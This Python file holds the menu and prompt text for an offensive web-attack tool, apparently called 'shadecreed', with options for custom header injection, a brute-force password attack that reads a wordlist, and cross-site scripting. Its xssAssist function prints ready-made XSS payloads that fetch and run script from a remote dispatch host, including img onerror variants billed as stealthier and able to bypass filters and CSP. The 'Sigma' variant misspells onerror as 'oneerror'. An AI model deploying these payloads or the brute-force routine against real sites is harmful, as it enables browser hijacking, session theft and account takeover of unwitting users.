import shutil,textwrap
width = shutil.get_terminal_size((80,20)).columns
red ='\033[1;31m'
blue = '\033[1;34m'
yellow='\033[1;33m'
plain='\033[1;0m'
green='\033[1;32m'
bg_blue='\033[1;44m'
kt = f"""
@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@  @@  @@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@ -@@@@: @@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@ :@@@@@@. @@@@@@@@@@@@@@@
@@@@@@@@@@@@@@. @@@@@@@@ :@@@@@@@@@@@@@@
@@@@@@@@@@@@@@ @@@@@@@@@@ @@@@@@@@@@@@@@
@@@@@@@@@@@@@ =@@@@@@@@@@- @@@@@@@@@@@@@
@@@@@@@@@@@@@ @@@@*  +@@@@ @@@@@@@@@@@@@
@@@@@@@@@@@@#*@@@  @@  @@@=%@@@@@@@@@@@@
@@@@@@@@@@@@ @@@ %@@@@% @@@ @@@@@@@@@@@@
@@@@@@@@@@@@ @% @@@@@@@@ %@ @@@@@@@@@@@@
@@@@@@@@@@@@@@ @@@@@@@@@@ @#@@@@@@@@@@@@
@@@@@@@@@@@#@ @@@@@@@@@@@@ @%@@@@@@@@@@@
@@@@@@@@@@@  @@  @@@@@@  @@  @@@@@@@@@@@
@@@@@@@@@@@ +@@%  @@@%  @@@- @@@@@@@@@@@
@@@@@@@@@@@ @@@@@@ @@.@@@@@@ @@@@@@@@@@@
@@@@@@@@@@@.@@*@@@@@@@@@@*@@.@@@@@@@@@@@
@@@@@@@@@@ @@@@ @@@@@@@@ @@@@ @@@@@@@@@@
@@@@@@@@@@ @@@@  @@@@@@  @@@@ @@@@@@@@@@
@@@@@@@@@@ @@@@ @@@@@@@@ @@@@ @@@@@@@@@@
@@@@@@@@@@ @@@@@.-@@@@-:@@@@@ @@@@@@@@@@
@@@@@@@@@@@ @@@@@ @@@@ @@@@@ @@@@@@@@@@@
@@@@@@@@@.@@ @@@@@+@@=%@@@@ @@ @@@@@@@@@
@@@@@@@: : @@ @@@@%==%@@@@ @@ : :@@@@@@@
@@@@@*@@@@@ @@ @@@@@@@@@@ @@ @@@@@*@@@@@
@@@@@@@@@@@@%@@*@@@@@@@@#@@%@@@@@@@@@@@@
@@@@@@@@@@@@@@+@@@@@@@@@@+@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@{blue}𝙶𝚒𝚝𝚑𝚞𝚋 - 𝚑𝚊𝚛𝚔𝚎𝚛𝚋𝚢𝚝𝚎{plain}
"""

payload =f"""
\033[1;44mCUSTOM HEADER INJECTION (HTTPs/HTTPsV2)\033[1;0m

[+] Switch to landscape mode if necessary.

[+] Type `headers` to display pre-configured custom \npayloads.
[+] Type `cheaders` to display already active configured \npayloads.

[+] To modify headers:
    - key=value               → Modify a single header
    - key1=value1,key2=value2 → Modify multiple headers

[+] To delete headers:
    - del=key               → Delete a specific header
    - del=all               → Clear all custom headers

[+] Type `{red}q{plain}` to exit.
──────────────────────────────────────────────────
"""
payloadQuit = f"""
CLOSED CUSTOM HEADER INJECTION - RECENT HEADERS SAVED
"""
def banner():
  return kt

def menu(target):
  op = textwrap.dedent(f"""
  [H] Header editor
  [B] Custom brute force - beta 
  [X] Cross site scripting
  [J] Join community
  [Q] Quit
  ──────────────────────────────────────────────
  """)
  return op

brute = f"""
\033[1;44mSTAGE BRUTE ATTACK\033[1;0m

[!] Fill the necessary fields as needed.
[!] Type `{yellow}brute{plain}` on the fields we will be making multiple attempt.
[!] Multiple attempts would be made on the fields, in which you have entered `{yellow}brute{plain}`

GOODLUCK
──────────────────────────────────────────────────
"""

password = f"""
{bg_blue}PASSWORD FILE - '/path_to_dir/file_name.txt'{plain}
[+] Make sure it available in the provide directory path
e.g '{yellow}/storage/emulated/0/downloads/passwords.txt{plain}
\n
"""
xss = f"""
{bg_blue}CROSS SITE SCRIPTING{plain}

[+] Type `{red}q{plain}` to quit.
[!] Read : {yellow}https://github.com/harkerbyte/shadecreed{plain}
"""

def bruteAssist():
  return brute
def passwordAssist():
  return password
def payloadInject():
  return payload
def payloadInjectQuit():
  return payloadQuit

def xssStart():
  return xss
def xssAssist(url):
  cross_site_script = textwrap.dedent(f"""
  🟢 Dispatch Host is LIVE!

  🔥 Injectable Payloads:
  ─────────────────────────────
  🦎 Endpoint: 
  {url}
  
  📎 Inline:
  {green}<script src="{url}"></script>{plain}

  ⚠️ Moderate (stealthier):
  {yellow}<img src=f onerror="fetch('{url}').then(r => r.text()).then(code => eval(code))">{plain}
  
  🗿 Sigma (more-stealthier):
  {red}<img src=f oneerror="fetch('{url}').then(r => r.text()).then(code => {{
    let s = document.createElement('script')
    s.textContent = code;
    document.body.appendChild(s);
    }})">{plain}
  ─────────────────────────────
  💡 Choose your level:
  - Enpoint serves generated payload cdn-like, inject - escape - execute.
  - Inline is direct and simple (less obfuscated).
  - Moderate uses `onerror` call execution — stealthier, bypasses some filters.
  - Sigma bypasses CSP/`eval` injects via DOM then execute.
  
  🔒 Server is actively serving payloads from:
  → `payload.js` 

  """)
  return cross_site_script